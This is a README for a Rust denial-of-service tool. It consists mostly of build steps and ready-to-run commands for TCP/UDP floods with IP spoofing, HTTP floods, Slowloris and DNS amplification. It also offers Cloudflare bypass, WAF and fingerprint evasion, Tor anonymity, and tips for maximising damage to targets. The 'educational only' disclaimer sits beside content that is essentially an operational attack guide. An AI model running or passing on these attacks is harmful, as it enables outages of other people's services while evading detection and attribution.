![Banner](https://raw.githubusercontent.com/FoORK-Lab/pass-gen-dependencies/refs/heads/main/ddos.jpg)

# Advanced DDoS Attack Tool

> **WARNING - EDUCATIONAL PURPOSE ONLY**: This tool is designed for authorized penetration testing and educational purposes. The author is not responsible for any misuse.

## What is Advanced DDoS Attack Tool?

This is a high-performance DDoS testing tool written in Rust, featuring:

- **Layer 4 Attacks**: TCP/UDP flooding with IP spoofing
- **Layer 7 Attacks**: HTTP flooding and Slowloris attacks  
- **Tor Integration**: Complete anonymity support
- **Multi-threading**: Lightning-fast concurrent operations
- **Cross-platform**: Works on Linux, macOS, and Windows

## 🚀 Advanced Evasion Features

- **Cloudflare Bypass**: Automatic challenge solving and TLS fingerprint evasion
- **WAF Evasion**: Advanced payload encoding and header manipulation
- **User-Agent Database**: 1000+ real browser signatures with rotation
- **Fingerprint Evasion**: JA3/HTTP2 fingerprint randomization
- **Stealth Mode**: Anti-detection with behavioral mimicry
- **DNS Amplification**: High-impact reflection attacks
- **Proxy Integration**: SOCKS5/HTTP proxy chain support

## Requirements

### System Requirements
- **Operating System**: Linux (recommended), macOS, or Windows
- **RAM**: Minimum 512MB, recommended 2GB+
- **CPU**: Multi-core processor recommended
- **Network**: High-bandwidth connection for effective testing

### Software Dependencies
1. **Rust** (version 1.70+)
   ```bash
   # Install Rust
   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
   source ~/.cargo/env
   ```

2. **Tor** (optional, for anonymity features)
   ```bash
   # Ubuntu/Debian
   sudo apt update && sudo apt install tor
   
   # macOS with Homebrew
   brew install tor
   
   # CentOS/RHEL
   sudo yum install tor
   ```

3. **Root privileges** (required for IP spoofing features)

## Installation

### Method 1: Quick Install (Recommended)
```bash
# Clone the repository
git clone https://github.com/karthik558/ddos-attack.git
cd ddos-attack

# Make scripts executable
chmod +x build.sh install.sh

# Build the project
./build.sh

# Install system-wide (optional)
sudo ./install.sh
```

### Method 2: Manual Build
```bash
# Clone and build manually
git clone https://github.com/karthik558/ddos-attack.git
cd ddos-attack
cargo build --release

# Binary will be at: ./target/release/ddos-attack
```

## How to Use

### Interactive Experience
The tool now automatically asks you about Tor usage and IP spoofing when you run attacks - no need for complex command-line flags!

### Basic Usage Pattern
```bash
./target/release/ddos-attack [ATTACK_TYPE] [OPTIONS]
```

### 1. Layer 4 Attacks (TCP/UDP Flooding)

#### TCP Flood Attack
```bash
./target/release/ddos-attack layer4 \
  --targets "192.168.1.100" \
  --ports "80,443,8080" \
  --protocol tcp \
  --threads 50 \
  --rate 1000 \
  --size 1024

# The tool will ask:
# 🔒 Do you want to use Tor for anonymity? (y/N): 
```

#### UDP Flood Attack
```bash
./target/release/ddos-attack layer4 \
  --targets "192.168.1.100" \
  --ports "53,123,161" \
  --protocol udp \
  --threads 100 \
  --rate 2000 \
  --size 512

# The tool will ask:
# 🔒 Do you want to use Tor for anonymity? (y/N): 
# 🎭 Do you want to enable IP spoofing? (requires root) (y/N): 
```

### 2. Layer 7 Attacks (HTTP/HTTPS)

#### HTTP Flood Attack
```bash
./target/release/ddos-attack layer7 \
  --targets "https://example.com" \
  --threads 50 \
  --rate 100 \
  --method GET \
  --user-agent "Mozilla/5.0 Custom Agent"

# The tool will ask:
# 🔒 Do you want to use Tor for anonymity? (y/N): 
```

#### Advanced HTTP Attack with Evasion
```bash
./target/release/ddos-attack layer7 \
  --targets "https://example.com" \
  --threads 100 \
  --rate 200 \
  --method GET \
  --cloudflare-bypass \
  --waf-evasion \
  --random-useragent

# Includes:
# - Cloudflare challenge bypass
# - WAF evasion techniques
# - Random User-Agent rotation
```

#### DNS Amplification Attack
```bash
./target/release/ddos-attack dns-amp \
  --target "192.168.1.100" \
  --domain "google.com" \
  --threads 20 \
  --rate 500 \
  --duration 300

# High-impact reflection attack
# Up to 70x amplification factor
```

#### Slowloris Attack
```bash
./target/release/ddos-attack layer7 \
  --targets "https://example.com" \
  --threads 300 \
  --slowloris

# The tool will ask:
# 🔒 Do you want to use Tor for anonymity? (y/N): 
```

### 3. Tor Management

```bash
# Start Tor service
./target/release/ddos-attack tor --start

# Renew Tor identity (change IP)
./target/release/ddos-attack tor --renew

# Stop Tor service
./target/release/ddos-attack tor --stop
```

## Examples Folder Usage

The `examples/` folder contains pre-configured attack scripts for common scenarios:

### Available Example Scripts:
1. **`tcp_flood.sh`** - Basic TCP flooding attack
2. **`http_flood_tor.sh`** - HTTP attack through Tor network
3. **`slowloris.sh`** - Slowloris connection exhaustion attack
4. **`udp_spoof.sh`** - UDP flooding with IP spoofing (requires root)

### How to Use Examples:
```bash
# Make examples executable
chmod +x examples/*.sh

# Run a specific example
./examples/tcp_flood.sh

# Or run with root for spoofing examples
sudo ./examples/udp_spoof.sh
```

**Note**: Edit the target IPs and parameters in the example scripts before running!

## Command Options Explained

### Layer 4 Options:
- `--targets`: Target IP addresses (comma-separated)
- `--ports`: Target ports (comma-separated)  
- `--protocol`: Attack protocol (`tcp` or `udp`)
- `--threads`: Number of concurrent threads (default: 100)
- `--size`: Packet size in bytes (default: 1024)
- `--rate`: Packets per second (default: 1000)

**Interactive prompts will ask about:**
- Tor usage for anonymity
- IP spoofing (UDP only, requires root)

### Layer 7 Options:
- `--targets`: Target URLs (comma-separated)
- `--threads`: Number of concurrent threads (default: 50)
- `--rate`: Requests per second (default: 100)
- `--method`: HTTP method (`GET`, `POST`, `PUT`, `DELETE`)
- `--user-agent`: Custom User-Agent string
- `--slowloris`: Enable Slowloris attack mode

**Interactive prompts will ask about:**
- Tor usage for anonymity

## Security Notes

### For IP Spoofing:
- Requires root/administrator privileges
- May be blocked by ISP or network equipment
- Use responsibly and only on authorized networks

### For Tor Usage:
- Automatically handles Tor daemon management
- Slower but provides anonymity
- Identity renewal changes exit nodes

## Performance Tips

1. **Optimize Thread Count**: Start with 50-100 threads, adjust based on system performance
2. **Rate Limiting**: Higher rates = more aggressive attacks but may crash targets
3. **Multiple Targets**: Distribute load across multiple targets for better results
4. **Monitor Resources**: Watch CPU and memory usage during attacks

## Troubleshooting

### Common Issues:

**"Permission denied" errors:**
```bash
# For IP spoofing features, run with sudo
sudo ./target/release/ddos-attack layer4 --spoof
```

**"Connection refused" on Tor:**
```bash
# Make sure Tor is installed and started
./target/release/ddos-attack tor --start
# Wait 10-15 seconds for Tor to initialize
```

**High CPU usage:**
```bash
# Reduce thread count
./target/release/ddos-attack layer4 --threads 20
```

**Compilation errors:**
```bash
# Update Rust toolchain
rustup update
# Clean and rebuild
cargo clean && cargo build --release
```

## Quick Start Guide

### For Beginners:
1. **Install requirements** (Rust + Tor)
2. **Clone and build** the project
3. **Start with examples** to learn
4. **Modify parameters** for your needs
5. **Always test responsibly**

### Example Workflow:
```bash
# 1. Build the tool
./build.sh

# 2. Test basic TCP attack
./examples/tcp_flood.sh

# 3. Try anonymous HTTP attack
./examples/http_flood_tor.sh

# 4. Advanced: UDP spoofing
sudo ./examples/udp_spoof.sh
```

## Legal & Ethical Use

### Authorized Uses:
- Penetration testing with written permission
- Educational purposes and research
- Testing your own infrastructure
- Security awareness demonstrations

### Prohibited Uses:
- Attacking systems without authorization
- Disrupting public services
- Any illegal activities
- Harming others' infrastructure

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your improvements
4. Test thoroughly
5. Submit a pull request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

**KARTHIK-LAL**
- GitHub: [@karthik558](https://github.com/karthik558)

---

**WARNING: With great power comes great responsibility. Use this tool ethically and legally!**

![](https://img.shields.io/github/license/karthik558/ddos-attack?style=for-the-badge)
